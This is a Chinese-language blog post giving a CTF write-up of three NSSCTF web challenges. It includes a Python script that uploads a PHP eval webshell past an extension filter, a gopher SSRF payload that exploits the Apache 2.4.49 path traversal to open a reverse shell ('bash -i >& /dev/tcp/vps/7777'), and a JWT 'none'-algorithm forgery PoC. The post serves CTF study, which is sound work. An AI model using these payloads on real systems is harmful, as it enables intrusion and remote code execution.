---
layout: post
title: NSSCTF 2周年
categories: [blog ]
tags: [CTF,]
description: "NSSCTF2周年比赛"
image:
  feature: /img/Zero.png
  credit: Azeril
  creditlink: azeril.com
 

---

# NSSCTF 2周年

- [ ] php签到  `考察/.绕过PATHINFO检查后缀`
- [ ] MyBox     `考察SSRFgopher+apache2.4.49漏洞 `
- [ ] MyJs    `考察ejs CVE  和lodash原型链污染  以及algorithm none签名认证`



## php签到

```php
<?php

function waf($filename){
    $black_list = array("ph", "htaccess", "ini");
    $ext = pathinfo($filename, PATHINFO_EXTENSION);
    foreach ($black_list as $value) {
        if (stristr($ext, $value)){
            return false;
        }
    }
    return true;
}

if(isset($_FILES['file'])){//
    $filename = urldecode($_FILES['file']['name']);
    $content = file_get_contents($_FILES['file']['tmp_name']);
    if(waf($filename)){
        file_put_contents($filename, $content);
    } else {
        echo "Please re-upload";
    }
} else{
    highlight_file(__FILE__);
}
```

简单分析，可控的是上传文件的名称和内容。

流程就是，把上传文件的内容，然后输入到上传文件文件名里面，但是文件名解码了一次，并且限制了后缀 ph和二个配置文件。

所以思路就是绕过黑名单，PATHINFO只会找最后一个.后面的名字，比如

这里绕过是用了`/.`记得编码也就是`%2F.`这样`shell.php/.意思也是当前目录的shell.php

![](/img/Two/1.png)

解题方式：

1. 通过python脚本上传
2. 通过html前端（然后抓包上传）

```python
import requests
url="http://127.0.0.1/831.php"
shell="<?php eval($_POST['shell'];?>"
file={
    'file': ('shell.php%2F.',shell,'image/jpeg')
}
res=requests.post(url=url,files=file)
print(res.text)
```

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>POST数据包POC</title>
</head>
<body>
<form action="http://127.0.0.1/831.php" method="post" enctype="multipart/form-data">
<!--链接是当前打开的题目链接-->
    <label for="file">文件名：</label>
    <input type="file" name="postedFile" id="postedFile"><br><!--name要根据题目的源码来调节-->
    <input type="submit" name="submit" value="提交">
</form>
</body>
</html>

```

![](/img/Two/2.png)

![](/img/Two/3.png)

## [NSSCTF 2nd]MyBox

打开界面就一个url传参口，首先考虑任意文件读取

![](/img/image-20230831220859948.png)

![](/img/image-20230831220945241.png)

然后自从上次的`Dasctf  /proc/1/envir·on`就能直接出flag，现在每次都要试一下万一呢（出题人忘了删肯定是。。）

![](/img/image-20230831221406317.png)

查看`file:///app/app.py`

```python
from flask import Flask, request, redirect
import requests, socket, struct
from urllib import parse
app = Flask(__name__)

@app.route('/')
def index():
    if not request.args.get('url'):
        return redirect('/?url=dosth')
    url = request.args.get('url')
    if url.startswith('file://'):
        with open(url[7:], 'r') as f:
            return f.read()
    elif url.startswith('http://localhost/'):
        return requests.get(url).text
    elif url.startswith('mybox://127.0.0.1:'):
        port, content = url[18:].split('/_', maxsplit=1)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect(('127.0.0.1', int(port)))
        s.send(parse.unquote(content).encode())
        res = b''
        while 1:
            data = s.recv(1024)
            if data:
                res += data
            else:
                break
        return res
    return ''

app.run('0.0.0.0', 827)
```

可以看出是ssrf就需要用到gopher协议了，但是这里mybox://127.0.0.1（用这个替代就行）

首先看一下报错（因为报错信息可能给出版本号这些）

```python
import urllib.parse
test =\
"""GET /xxx.php HTTP/1.1
Host: 127.0.0.1:80

"""
#注意后面一定要有回车，回车结尾表示http请求结束
tmp = urllib.parse.quote(test)
new = tmp.replace('%0A','%0D%0A')
result = 'gopher://127.0.0.1:80/'+'_'+new
print(result)
```

![](/img/image-20230831221745028.png)

2.4.49又是这个，直接打

```python
import urllib.parse
payload =\
"""POST /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh HTTP/1.1
Host: 127.0.0.1:80
Content-Type: application/x-www-form-urlencoded
Content-Length: 58

echo;bash -c 'bash -i >& /dev/tcp/vps/7777 0>&1'
"""
#注意后面一定要有回车，回车结尾表示http请求结束。
tmp = urllib.parse.quote(payload)
new = tmp.replace('%0A','%0D%0A')
result = 'gopher://127.0.0.1:80/'+'_'+new
result = urllib.parse.quote(result)
print(result)       # 这里因为是GET请求发包所以要进行两次url编码

```

把gopher换成mybox即可，在start.sh中发现flag位置，直接cat

![](/img/image-20230831222612845.png)

## [NSSCTF 2nd]MyJs

赛后复现，题目环境有点问题打不开，只能先看看源码

```javascript
const express = require('express');
const bodyParser = require('body-parser');
const lodash = require('lodash');
const session = require('express-session');
const randomize = require('randomatic');
const jwt = require('jsonwebtoken')
const crypto = require('crypto');
const fs = require('fs');

global.secrets = [];

express()
    .use(bodyParser.urlencoded({extended: true}))
    .use(bodyParser.json())
    .use('/static', express.static('static'))
    .set('views', './views')
    .set('view engine', 'ejs')
    .use(session({
        name: 'session',
        secret: randomize('a', 16),//secret密钥是随机生成的
        resave: true,
        saveUninitialized: true
    }))
    .get('/', (req, res) => {
        if (req.session.data) {//如果存在data这个cookie
            res.redirect('/home');
        } else {
            res.redirect('/login')
        }
    })
    .get('/source', (req, res) => {
        res.set('Content-Type', 'text/javascript;charset=utf-8');
        res.send(fs.readFileSync(__filename));
    })
    .all('/login', (req, res) => {
        if (req.method == "GET") {
            res.render('login.ejs', {msg: null});
        }
        if (req.method == "POST") {
            const {username, password, token} = req.body;//这里通过post给 username password token传参
            const sid = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()).secretid;
            //将第二部分解码，取出jwt负载部分中的secretid属性

            if (sid === undefined || sid === null || !(sid < global.secrets.length && sid >= 0)) {
                //这里肯定是返回false，              （需要 sid <16  >0)
                return res.render('login.ejs', {msg: 'login error.'});
            }
            const secret = global.secrets[sid];//从这里看起来 sid 像是一个下标
            const user = jwt.verify(token, secret, {algorithm: "HS256"});//验证jwt，如果成功会返回一个用户信息的对象
            if (username === user.username && password === user.password) {//这里求的是 username是可控的， 其实我们可以把注册界面的 token拿过来，一定小于 secrets.length，因为注册的时候又加了一个数组长度
                req.session.data = {
                    username: username,//如果成立了，就赋值
                    count: 0,
                }
                res.redirect('/home');
            } else {
                return res.render('login.ejs', {msg: 'login error.'});
            }
        }
    })
    .all('/register', (req, res) => {
        if (req.method == "GET") {
            res.render('register.ejs', {msg: null});
        }
        if (req.method == "POST") {
            const {username, password} = req.body;
            if (!username || username == 'nss') {//用户名不能为 nss
                return res.render('register.ejs', {msg: "Username existed."});
            }
            const secret = crypto.randomBytes(16).toString('hex');//secret也是一个随机数
            const secretid = global.secrets.length;//这里其实只知道 secrets[]是一个数组，单具体不知道
            global.secrets.push(secret);//把secret 添加到 secrets数组中
            const token = jwt.sign({secretid, username, password}, secret, {algorithm: "HS256"});
            //sign是用来生成jwt的东西，secrets是密钥，后面是算法
            res.render('register.ejs', {msg: "Token: " + token});
        }
    })   //其实通过这个注册路由，可以获得secretid，也就是数组的长度


    .all('/home', (req, res) => {
        res.render('home.ejs', {
        })
    })
    .post('/update', (req, res) => {
        req.session.data={//初始化session
            username: "nss",
            count: 0,
        }
        let data = req.session.data || {};
        req.session.data = lodash.merge(data, req.body);//原型链污染  导致data可控
        console.log(req.session.data.outputFunctionName);//outputFunctionName 这个变量肯定有用，污染的话
        console.log({}.__proto__)
        res.redirect('/home');
    })
    .listen(827, '0.0.0.0')
```

- /register

会通过指定的密钥生成一个jwt的token，然后我们可以获得secretid

- /login
- 生成了一个session，里面的username可控
- /update

也是生成了一个session，username指定为nss，并且里面有原型链污染

#### (过了一天环境正常了)

其实通过上面的就一直在想，即使原型链污染了又在哪触发呢比如反弹shell这种

直接注册

![](/img/image-20230901142039885.png)

![](/img/image-20230901142207504.png)

secretid为2，返回了数组长度，为了证实又发了几次包（因为把密钥push到了数组，所以会发生变化）

![](/img/image-20230901142309769.png)

输入登陆后发现进入了/home

![](/img/image-20230901143536361.png)

这里不太懂UID是什么（这里可以看出没通过这个校验，不能执行后面）

UID，用户[身份证明](https://baike.baidu.com/item/身份证明/2015571?fromModule=lemma_inlink)（User Identification）的缩写，[网络平台](https://baike.baidu.com/item/网络平台/24446534?fromModule=lemma_inlink)注册时系统自动生成的数值

![](/img/image-20230901143522302.png)

https://www.secpulse.com/archives/129304.html

网上找到了这篇文章，总结一下：

```
const user = jwt.verify(token, secret, {algorithm: 'HS256'});
verify()指定算法的正确方式应该是通过algorithms传入数组，而不是algorithm。
在jwt库中，如果没指定算法，则默认使用none。   
```

并且给出了一个poc，因为直接截取token中的secretid,直接让它为[]

```
const jwt = require('jsonwebtoken');

var payload = {
secretid: [],
username: 'admin',
password: '1'
}
var token = jwt.sign(payload, undefined, {algorithm: 'none'});
console.log(token);
```

```
var secret="aaaaaaaaaaa";
console.log(secret[[]])   //undefined

var secret="aaaaaaaaaaa";
console.log(secret[0])   //a
```

但是新的问题又来了（连接中的题是如果username是admin经过伪造就给出了flag，但是这道题不是这样的）

肯定是update有问题，看了许久发现了。。。

![image-20230901145941796](![](/img/image-20230901145941796.png)

后面是{}和上次nep那个req.query有啥区别，只不过上次直接传，这次是原型链污染（ejs的那个CVE）

然后实验了发现压根就过不去那个校验 can't 修改 uid

`翻了佬们wp又明白了。。。`

这里需要用户名伪造为nss（擦）

![](/img/image-20230901152416187.png)

![](/img/image-20230901152437696.png)

这样就可以修改了（然后反弹shell，最后flag在env里面）

![](/img/image-20230901152616190.png)

![](/img/image-20230901152639325.png)

#### 总结

```
这个nss应该想到的，都生成cookie了，用户名不匹配不就不对了嘛，然后register过滤了用户名nss，肯定有用。。。
```

